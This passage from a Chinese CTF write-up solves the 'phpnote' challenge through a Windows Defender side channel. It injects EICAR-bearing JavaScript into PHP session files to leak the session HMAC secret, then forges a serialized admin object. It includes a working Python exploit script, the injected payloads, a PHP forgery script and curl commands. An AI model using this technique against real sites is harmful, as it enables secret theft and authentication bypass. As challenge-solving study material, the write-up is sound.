<span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        <span class="meta">?&gt;</span></span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome, <span class="php"><span class="meta">&lt;?</span>=$realname<span class="meta">?&gt;</span></span><span class="php"><span class="meta">&lt;?</span>= !<span class="keyword">empty</span>($nickname) ? <span class="string">" ($nickname)"</span> : <span class="string">""</span> <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/?action=logout"</span>&gt;</span>logout<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;a href="/?action=source"&gt;source&lt;/a&gt; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">            <span class="keyword">foreach</span>($note-&gt;getnotes() <span class="keyword">as</span> $k =&gt; $v) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">list</span>($title, $body) = $v;</span></span><br><span class="line"><span class="php">                $title = htmlspecialchars($title);</span></span><br><span class="line"><span class="php">                $body = htmlspecialchars($body);</span></span><br><span class="line"><span class="php">        <span class="meta">?&gt;</span></span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$title<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$body<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        <span class="meta">?&gt;</span></span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/?action=post"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"title"</span> <span class="attr">placeholder</span>=<span class="string">"title"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">"body"</span> <span class="attr">placeholder</span>=<span class="string">"body"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Post<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="meta">?&gt;</span></span></span><br><span class="line">        <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">        <span class="meta">?&gt;</span></span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.querySelector(<span class="string">"form#login"</span>).addEventListener(<span class="string">'submit'</span>, (e) =&gt; &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">const</span> nickname = <span class="built_in">document</span>.querySelector(<span class="string">"input#nickname"</span>)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">const</span> firstname = <span class="built_in">document</span>.querySelector(<span class="string">"input#firstname"</span>)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">const</span> lastname = <span class="built_in">document</span>.querySelector(<span class="string">"input#lastname"</span>)</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.querySelector(<span class="string">"input#realname"</span>).value = <span class="string">`<span class="subst">$&#123;firstname.value&#125;</span> <span class="subst">$&#123;lastname.value&#125;</span>`</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span> (nickname.value.length == <span class="number">0</span> &amp;&amp; firstname.value.length &gt; <span class="number">0</span> &amp;&amp; lastname.value.length &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="undefined">                    nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase()</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">            &#125;)</span></span><br><span class="line"><span class="undefined">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>从代码可以看出，得到flag的条件是调用<code>Note</code>类中的<code>getflag</code>函数，并且类中成员<code>$this-&gt;isadmin === true</code>。</p>
<p>若能成功找到可控的反序列化漏洞点，就能控制成员变量，反序列化点如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$note = verify($_COOKIE[<span class="string">'note'</span>], $_COOKIE[<span class="string">'hmac'</span>])</span><br><span class="line">             ? unserialize(base64_decode($_COOKIE[<span class="string">'note'</span>]))</span><br><span class="line">             : <span class="keyword">new</span> Note(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
<p>这里对<code>$_COOKIE[&#39;note&#39;]</code>变量进行了反序列化，但只有通过<code>verify($_COOKIE[&#39;note&#39;], $_COOKIE[&#39;hmac&#39;])</code>函数的校验，才能进行反序列化，查看<code>verify</code>函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify</span><span class="params">($data, $hmac)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $secret = $_SESSION[<span class="string">'secret'</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($secret)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> hash_equals(hash_hmac(<span class="string">'sha256'</span>, $data, $secret), $hmac);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>使用了安全的<code>hash_equals</code>函数进行比较<code>hash</code>，<code>$_SESSION[&#39;secret&#39;]</code>作为使用 HMAC 生成信息摘要时所使用的密钥。<code>$_SESSION[&#39;secret&#39;]</code>的生成方式如下：<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($action === <span class="string">'login'</span>) &#123;</span><br><span class="line">    ....................</span><br><span class="line">        $_SESSION[<span class="string">'secret'</span>] = gen_secret($nickname);</span><br><span class="line">    &#125;</span><br><span class="line">    redirect(<span class="string">'index'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在登录时通过gen_secret函数生成:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_secret</span><span class="params">($seed)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> md5(SALT . $seed . PEPPER);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>$_SESSION[&#39;secret&#39;]</code>根据我们可控的<code>$nickname</code>和两个未知的常量md5后生成。</p>
<p><code>verify</code>函数的整个校验过程非常的强壮，逻辑上并不存在问题。</p>
<h3 id="php-session-机制"><a href="#php-session-机制" class="headerlink" title="php session 机制"></a>php session 机制</h3><p>当我们在代码中调用<code>session_start()</code>;时，PHP会同时往SESSION的存放目录(默认为/tmp/)和客户端的cookie目录各生成一个文件。session文件名称像这样：<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20180506/29ee8d4772964fc4b9b18f046422829f.jpeg" alt=""></p>
<p>PHP session 运行机制就是客户端将<code>session id</code>传递到服务器，服务器根据<code>session id</code>找到对应的文件，读取的时候对文件内容进行反序列化就得到session的值，保存的时候先序列化再写入</p>
<p>在<code>php.ini</code>中默认是用磁盘文件来实现php会话<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session<span class="selector-class">.save_handler</span> = files</span><br></pre></td></tr></table></figure></p>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>因为服务器是<code>windows10</code>，又<code>session</code>会以文件形式存储，根据开头介绍的<code>Windows defender</code>特性，我们可以侧信道攻击</p>
<p>题目中我们可控的几个输入变量会到<code>$_SESSION</code>中，那么最后都会作为文件存入服务器，都会经过<code>Windows Defender</code>的扫描检测。</p>
<p>向session文件中注入精心构造的HTML和JS代码，使secret内容成为body，沙盒引擎执行JS对secret进行猜解，猜解成功则触发<code>Windows Defender</code>对session文件进行拦截和修改，session文件损坏，通过账户是否能够正常登录作为侧信道进行判断。</p>
<p>本地搭建测试环境：<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">realname|<span class="type">s</span>:<span class="number">18</span>:<span class="string">"FirstName LastName"</span>;nickname|<span class="type">s</span>:<span class="number">8</span>:<span class="string">"NickName"</span>;secret|<span class="type">s</span>:<span class="number">32</span>:<span class="string">"3d5fb7437288f6966e4dbe5fabb1b64f"</span>;</span><br></pre></td></tr></table></figure></p>
<p>观察发现我们可控的<code>realname</code>和<code>nickname</code>都在前面，无法注入<code>&lt;body&gt;&lt;/body&gt;</code>包裹<code>secret</code>，这样的顺序和位置很重要，因为我们要leak secret，需要<code>secret</code>在中间。</p>
<p>观察登录的判断：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($action === <span class="string">'login'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($method === <span class="string">'POST'</span>) &#123;</span><br><span class="line">        $nickname = (string)$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        $realname = (string)$_POST[<span class="string">'realname'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($realname) || strlen($realname) &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'invalid name'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_SESSION[<span class="string">'realname'</span>] = $realname;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($nickname)) &#123;</span><br><span class="line">            $_SESSION[<span class="string">'nickname'</span>] = $nickname;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'secret'</span>] = gen_secret($nickname);</span><br><span class="line">    &#125;</span><br><span class="line">    redirect(<span class="string">'index'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>login的行为可以多次进行，这意味着可以修改session文件存储内容，并且<code>$realname</code>是必须存在，但<code>$nickname</code>并非必要。</p>
<p>第一次发送请求只包含<code>$realname</code>，<code>$nickname</code>为空，<code>realname=111111&lt;body&gt;</code>，session文件如下：<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">realname|<span class="type">s</span>:<span class="number">12</span>:<span class="string">"111111&lt;body&gt;"</span>;secret|<span class="type">s</span>:<span class="number">32</span>:<span class="string">"aab9ba42b5591219a5b20e34e0c83b78"</span>;</span><br></pre></td></tr></table></figure></p>
<p>第二次发送请求，<code>realname=111111&lt;body&gt;&amp;nickname=&lt;/body&gt;</code>，session文件如下：<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">realname|<span class="type">s</span>:<span class="number">12</span>:<span class="string">"111111&lt;body&gt;"</span>;secret|<span class="type">s</span>:<span class="number">32</span>:<span class="string">"1cfd6d24dfd62963df7324feb1faf6fd"</span>;nickname|<span class="type">s</span>:<span class="number">7</span>:<span class="string">"&lt;/body&gt;"</span>;</span><br></pre></td></tr></table></figure></p>
<p>可以看到secret已经被<code>&lt;body&gt;</code>标签包裹，然后继续注入猜解body的JS。</p>
<p>这里我们只能将JS注入在<code>realname</code>中，因为<code>nickname</code>会被用于生成<code>secret</code>，所以我们让其始终为<code>&lt;/body&gt;</code>。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">_SESSION[<span class="string">'secret'</span>] = gen_secret(<span class="variable">$nickname</span>);</span></span><br></pre></td></tr></table></figure></p>
<p>也就是将变为三个常量拼接成为MD5参数：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="name">SALT</span> . '&lt;/body&gt;' . PEPPER)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>这样生成<code>secret</code>将不会随着<code>realname</code>中的payload进行变化，修改realname中的内容如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> body = <span class="built_in">document</span>.body.innerHTML;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> a = &#123;<span class="number">1</span>: <span class="string">''</span>&#125;;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> x = a[<span class="built_in">Number</span>(body.charCodeAt(<span class="number">10</span>) == <span class="number">0</span>)];</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> mal = <span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span> + x;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">eval</span>(mal);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>再次发送请求，查看session文件：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">realname|s:280:"<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> body = <span class="built_in">document</span>.body.innerHTML;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> a = &#123;<span class="number">1</span>: <span class="string">''</span>&#125;;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> x = a[<span class="built_in">Number</span>(body.charCodeAt(<span class="number">10</span>) == <span class="number">0</span>)];</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> mal = <span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span> + x;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">eval</span>(mal);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>";secret|s:32:"1cfd6d24dfd62963df7324feb1faf6fd";nickname|s:7:"<span class="tag">&lt;/<span class="name">body</span>&gt;</span>";</span><br></pre></td></tr></table></figure></p>
<p>最终exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">"http://phpnote.chal.ctf.westerns.tokyo"</span> <span class="comment"># changeme</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger</span><span class="params">(c, idx)</span>:</span></span><br><span class="line">   <span class="keyword">import</span> string</span><br><span class="line">   p = <span class="string">'''&lt;script&gt;f=function(n)&#123;eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H'+&#123;$&#123;c&#125;:'*'&#125;[Math.min($&#123;c&#125;,n)])&#125;;f(document.body.innerHTML[$&#123;idx&#125;].charCodeAt(0));&lt;/script&gt;&lt;body&gt;'''</span></span><br><span class="line">   p = string.Template(p).substitute(&#123;<span class="string">'idx'</span>: idx, <span class="string">'c'</span>: c&#125;)</span><br><span class="line">   <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(idx)</span>:</span></span><br><span class="line">   l, h = <span class="number">0</span>, <span class="number">0x100</span></span><br><span class="line">   <span class="keyword">while</span> h - l &gt; <span class="number">1</span>:</span><br><span class="line">       m = (h + l) // <span class="number">2</span></span><br><span class="line">       gid = trigger(m, idx)</span><br><span class="line">       <span class="comment"># r = requests.post(URL + '/?action=login', data=&#123;'realname': gid, 'nickname': '1'&#125;)</span></span><br><span class="line">       <span class="comment"># print r.content</span></span><br><span class="line">       <span class="comment"># exit()</span></span><br><span class="line">       s = requests.session()</span><br><span class="line">       s.post(URL + <span class="string">'/?action=login'</span>, data=&#123;<span class="string">'realname'</span>: gid, <span class="string">'nickname'</span>: <span class="string">''</span>&#125;)</span><br><span class="line">       <span class="keyword">if</span> <span class="string">"/?action=login"</span> <span class="keyword">in</span> s.post(URL + <span class="string">'/?action=login'</span>, data=&#123;<span class="string">'realname'</span>: gid, <span class="string">'nickname'</span>: <span class="string">'&lt;/body&gt;'</span>&#125;).content:</span><br><span class="line">           l = m</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           h = m</span><br><span class="line">   <span class="keyword">return</span> chr(l)</span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">   data += leak(i)</span><br><span class="line">   print(data)</span><br></pre></td></tr></table></figure></p>
<p>构造序列化内容：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Note</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($admin)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;notes = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;isadmin = $admin;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addnote</span><span class="params">($title, $body)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        array_push(<span class="keyword">$this</span>-&gt;notes, [$title, $body]);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getnotes</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;notes;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isadmin === <span class="keyword">true</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> FLAG;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">verify</span><span class="params">($data, $hmac)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    $secret = $_SESSION[<span class="string">'secret'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (<span class="keyword">empty</span>($secret)) <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> hash_equals(hash_hmac(<span class="string">'sha256'</span>, $data, $secret), $hmac);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">hmac</span><span class="params">($data)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    $secret = $_SESSION[<span class="string">'secret'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (<span class="keyword">empty</span>($data) || <span class="keyword">empty</span>($secret)) <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> hash_hmac(<span class="string">'sha256'</span>, $data, $secret);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">gen_secret</span><span class="params">($seed)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="string">"2532bd172578d19923e5348420e02320"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">// create session</span></span></span><br><span class="line"><span class="php">$_SESSION = <span class="keyword">Array</span>();</span></span><br><span class="line"><span class="php">$_SESSION[<span class="string">'secret'</span>] = gen_secret(<span class="string">''</span>);</span></span><br><span class="line"><span class="php">$_SESSION[<span class="string">'realname'</span>] = <span class="string">"stypr stypr"</span>;</span></span><br><span class="line"><span class="php">$_SESSION[<span class="string">'nickname'</span>] = <span class="string">""</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">// generate note</span></span></span><br><span class="line"><span class="php">$note = <span class="keyword">new</span> Note(<span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">$note-&gt;addnote(<span class="string">"work"</span>, <span class="string">"work"</span>);</span></span><br><span class="line"><span class="php">$data = base64_encode(serialize($note));</span></span><br><span class="line"><span class="php"></span></span><br><span class="line">/* verify</span><br><span class="line">//echo "Data: ".(string)$data."\n";</span><br><span class="line">//echo "HMAC: ".(string)hmac($data)."\n";</span><br><span class="line">//echo "-----";</span><br><span class="line">//var_dump(verify((string)$data, (string)hmac($data)));</span><br><span class="line"><span class="php">*/</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">curl -s 'http://phpnote.chal.ctf.westerns.tokyo/?action=logout' -H 'Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a;' --insecure</span><br><span class="line">curl -s 'http://phpnote.chal.ctf.westerns.tokyo/?action=login' -H 'Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a;' --data 'nickname=<span class="tag">&lt;/<span class="name">body</span>&gt;</span>&amp;realname=stypr+stypr' --compressed --insecure</span><br><span class="line">curl -s "http://phpnote.chal.ctf.westerns.tokyo/?action=getflag" -H "Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a; note=<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $data; <span class="meta">?&gt;</span></span>; hmac=<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> hmac($data); <span class="meta">?&gt;</span></span>;"</span><br></pre></td></tr></table></figure></p>
<p>reference:<br><a href="https://forum.90sec.com/t/topic/406/1" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/406/1</a><br><a href="https://www.processlibrary.com/en/directory/files/mpengine/404976/" target="_blank" rel="noopener">https://www.processlibrary.com/en/directory/files/mpengine/404976/</a><br><a href="https://www.secpulse.com/archives/112377.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/112377.html</a></p>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/09/22/vulnerable/Windows Defender 侧信道攻击/">http://microvorld.com/2019/09/22/vulnerable/Windows Defender 侧信道攻击/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/10/12/cve/Joomla 3.4.6 RCE/" title="Joomla 3.4.6 RCE 复现"><span>< PreviousPost</span><br><span class="prevTitle">Joomla 3.4.6 RCE 复现</span></a><a class="nextSlogan" href="/2019/08/17/CTF/拟态防御与calc/" title="calc与拟态防御"><span>NextPost ></span><br><span class="nextTitle">calc与拟态防御</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-Defender-侧信道攻击"><span class="toc-number">1.</span> <span class="toc-text">Windows Defender 侧信道攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Defender"><span class="toc-number">1.1.</span> <span class="toc-text">Windows Defender</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一般检测行为"><span class="toc-number">1.2.</span> <span class="toc-text">一般检测行为</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#滥用"><span class="toc-number">1.3.</span> <span class="toc-text">滥用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 